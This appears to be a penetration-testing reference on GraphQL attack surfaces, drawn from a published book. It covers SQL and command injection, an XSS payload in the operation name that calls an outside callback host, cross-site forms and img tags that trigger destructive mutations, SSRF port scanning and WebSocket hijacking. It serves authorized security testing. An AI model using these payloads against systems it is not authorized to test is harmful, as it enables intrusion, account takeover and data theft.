# Injection surfaces, CSRF, SSRF and subscription hijacking

GraphQL does not invent new injection *classes* — it adds new **places** to inject,
and it changes what the surrounding defenses can see. This file is about those
differences; the exploitation of each class belongs to the skill that owns it.

## Contents

- The four injection surfaces
- SQL injection through an argument
- Command injection through an argument
- XSS — and the operation name, which is a blind-XSS sink
- CSRF: the content type is the control
- State-changing operations implemented as `query`
- SSRF, and the split-URL shape that defeats allowlists
- Cross-site WebSocket hijacking of subscriptions

## The four injection surfaces

Everyone tests the first. The last two are close to untested in the wild.

1. **Query / mutation arguments** — `pastes(filter: "…")`. The obvious one.
2. **Field arguments** — arguments on a *nested* field, not the top-level one:
   `users { username(capitalize: true) } }`. Separate resolver, separate code path,
   frequently separate (absent) validation.
3. **Directive arguments** — `ipAddr @show_network(style: "cidr")`. Custom
   directives are entirely outside the specification, so nothing standard validates
   them, and a directive argument that reaches a query builder is a real sink. List
   them with `{ __schema { directives { name args { name } locations } } }`.
4. **The operation name** — `query <HERE> { … }`. A client-chosen free-form string
   that most implementations barely constrain. It is not a resolver input, which is
   exactly why nobody sanitizes it — and it is written to logs, analytics, tracing
   and audit tables. See the XSS section.

Test all four with the same battery: a quote, a backslash, a null byte, a newline,
a shell metacharacter, an oversized value, a wrong scalar type, a negative number.
Watch for the error shape changing (`schema-recovery.md` §errors) — that is your
first signal.

## SQL injection through an argument

The argument names that reach a query builder: `filter`, `where`, `search`,
`query`, `keyword`, `orderBy`, `sort`, `groupBy`, `having`, `q`, and any `*Id` used
in a lookup. A `filter` that performs substring matching is a `LIKE` clause:

```graphql
query { pastes(filter: "known-value'") { id title } }
```

An error naming the engine (`sqlite3.OperationalError`, `ER_PARSE_ERROR`,
`SQLSTATE`, `ORA-`) confirms concatenation. Then everything is
`../../sqli` — the balance test, the discriminating control, error-based
extraction, and the rule that a self-verifying extracted value is what separates
a High from an informative.

Two operational details specific to driving `sqlmap` through GraphQL:

```bash
# mark the injection point INSIDE the GraphQL string with *
#   {"query":"query { pastes(filter:\"test*\") { id } }"}
sqlmap -r request.txt --dbms=<engine> --tables
```

- answer **N** to *"JSON data found in POST body. Do you want to process it?"* —
  letting sqlmap treat the body as JSON makes it mangle the GraphQL document;
- give `--dbms` explicitly once you have fingerprinted the engine from an error, so
  it does not spend hundreds of requests on irrelevant payload families.

## Command injection through an argument

Field names starting with or containing `system`, `debug`, `diagnostic`, `health`,
`update`, `exec`, `run`, `ping`, `trace`, `convert`, `render` are worth opening
first — they suggest a shell or a binary behind the resolver. The tell is an
argument whose value visibly changes the *format* of the output rather than its
content: passing `ef` to a `systemDebug(arg:)` that returns process output means
your value is being concatenated into `ps`.

Separators to try, in order: `;`, `&`, `&&`, `||`, backtick, `$( )`, and a newline.
Confirm with something inert and self-evidencing (`id`, `uptime`, `whoami`) — never
a shell, never a write. Everything past confirmation is `../../rce-hunting`, which
owns the ladder and the bounds; `commix --url=… --data='…' -p arg` automates the
separator sweep when it is available.

## XSS — and the operation name, which is a blind-XSS sink

Ordinary stored XSS applies: a mutation that persists attacker HTML into a field
another user renders. Nothing GraphQL-specific except the delivery, and
`../../xss` owns the payloads and the callback.

The GraphQL-specific one is the **operation name**:

```graphql
mutation "><img src=x onerror=import('//xss.report/c/d0x/?src=opname')> {
  createPaste(title: "x", content: "y") { paste { id } }
}
```

Applications record operation names for analytics, debugging and audit — and then
**render them in an internal console that staff read**. That is the textbook
blind-XSS shape: an input you control, stored now, rendered later by a privileged
viewer, in a surface you cannot see. It is also a log-integrity issue on its own,
since the name a defender sees is chosen by the attacker.

Implementations differ in which characters they accept in an operation name, so
probe the constraint first with something harmless before spending a payload.
Register the attempt through `../../xss/references/callback-setup.md` and
treat a callback as the proof.

**Reflected XSS needs GET queries** to be deliverable as a link:

```
https://target/graphql?query=query{hello(msg:"<payload>")}
```

which makes "are GET queries supported" a precondition worth establishing early —
it is the same precondition CSRF needs.

## CSRF: the content type is the control

An HTML `<form>` can send only `application/x-www-form-urlencoded`,
`multipart/form-data` or `text/plain`. A GraphQL server that requires
`application/json` therefore **cannot** be attacked with a plain cross-site form.
One that accepts a form encoding can:

```html
<form id="f" method="POST" action="https://target/graphql">
  <input type="hidden" name="query"
         value="mutation { deleteAccount(id: 1) { ok } }">
</form>
<script>document.forms['f'].submit()</script>
```

So the test is a content-type differential, and it takes two requests:

```bash
curl -s -X POST "$U" -H 'Content-Type: application/json' -d '{"query":"{__typename}"}'
curl -s -X POST "$U" -H 'Content-Type: application/x-www-form-urlencoded' \
     --data-urlencode 'query={__typename}'
```

Both answering means the server converts form bodies back to GraphQL, and the
CSRF surface is open. Then confirm a **state-changing** operation actually executes
that way — a `__typename` over a form encoding is not a finding.

**GET queries widen it further**, because no form is needed at all:

```html
<img src="https://target/graphql?query=mutation{someAction}" style="display:none">
<a  href="https://target/graphql?query=mutation{someAction}">click</a>
```

and those tags can be planted through an **HTML injection on the target's own
pages**, which turns the whole thing into a self-contained same-site chain with no
attacker domain involved. Note the corollary: many servers deliberately reject
*mutations* over GET while still allowing *queries* — see the next section for why
that mitigation is often void.

Anti-CSRF token handling, when one exists, fails the usual ways: send the parameter
with an empty value, omit the parameter entirely, reuse a token from your own
session, or substitute a same-length random string. Check `SameSite` on the session
cookie in the same pass — `None` means no browser-side protection, and modern
browsers default to `Lax`, which still permits top-level `GET` navigations.

## State-changing operations implemented as `query`

The specification says queries read and mutations write. Implementations do not
enforce it, and developers do not always obey it. Enumerate the query fields and
read the verbs:

```graphql
{ __schema { queryType { fields { name } } } }
```

A `deleteAllPastes`, `resetPassword`, `createInvite` or `approve` sitting under
`queryType` is both a design defect and the thing that voids the "no mutations over
GET" mitigation — because it is not a mutation. That combination is the highest
value outcome in this section: a state-changing action, reachable over GET,
triggerable from an `<img>` tag.

## SSRF, and the split-URL shape that defeats allowlists

Argument names that mean an outbound request: `url`, `uri`, `href`, `src`, `link`,
`host`, `hostname`, `domain`, `site`, `ip`, `address`, `endpoint`, `target`,
`target_url`, `img_url`, `remote_url`, `callback`, `webhook`, `feed`, `path`,
`scheme`, `port`. Field-name verbs: `fetch`, `import`, `download`, `load`, `read`,
`preview`, `render`, `proxy`, `sync`, `webhook`.

The shape worth recognising, because it is common in GraphQL and rare elsewhere:

```graphql
mutation { importPaste(scheme: "https", host: "example.com", port: 443, path: "/x") { result } }
```

**The URL never exists as a string on the wire** — the server assembles it from
four separate typed arguments. Every URL allowlist, URL parser and WAF rule that
operates on a URL sees nothing to inspect, and the usual bypass ladder
(`userinfo@`, `%2f`, parser confusion) is unnecessary because there is no parser to
confuse. Two consequences:

- `host` takes an internal name or address directly, with no encoding tricks;
- `port` is a **first-class integer argument**, which makes port scanning a
  one-alias-per-port batch (`batching-abuse.md`) — the XSPA variant, and the
  cheapest internal-network map you will get.

The blind oracle here is a **hang**: a closed port returns an empty result almost
immediately, while an open port that never replies leaves the request pending until
timeout. Time the responses rather than reading them. Everything else — OOB
confirmation, correlating the callback to your request, the egress fingerprint, the
metadata escalation — is `../../ssrf-safe`, which owns this class.

## Cross-site WebSocket hijacking of subscriptions

Subscriptions ride a WebSocket, and the handshake is an ordinary HTTP request that
carries the victim's cookies. If the server does not validate `Origin`, any page
can open an authenticated subscription in the victim's context and read the stream.

Establish that subscriptions exist:

```graphql
{ __schema { subscriptionType { fields { name } } } }
```

A non-null `subscriptionType` and a `ws(s)://…/subscriptions` (or `/graphql`)
upgrade in the traffic means test it. The check is one request:

```bash
curl -sD - -o /dev/null "https://target/subscriptions" \
  -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Sec-WebSocket-Version: 13' \
  -H 'Sec-WebSocket-Key: AAAAAAAAAAAAAAAAAAAAAA==' \
  -H 'Origin: https://attacker.example'
```

`101 Switching Protocols` with a foreign `Origin` = **not validated**.
`403`/`400` = validated, rotate. Confirm end to end from a page on a genuinely
different origin — open the socket, send the graphql-ws `connection_init` then
`start` with a subscription document, and show the `data` frames arriving. The
proof is the victim's data reaching an origin you control; use your own second
account as the victim.

Impact grades on what the subscription streams. A feed of the victim's own records
is a session-scoped read — High when it carries PII or tokens. Handshake-only, with
nothing sensitive on the stream, is Low. `../../broken-access-control/references/realtime-authz.md`
owns WebSocket authorization beyond the handshake.

## Source

Distilled from *Black Hat GraphQL* (Aleks & Farhi, No Starch Press, 2023),
chapters 8 and 9. Exploitation of each class stays with the skill that owns it —
this file exists to name the GraphQL-shaped entry points and hand them over.
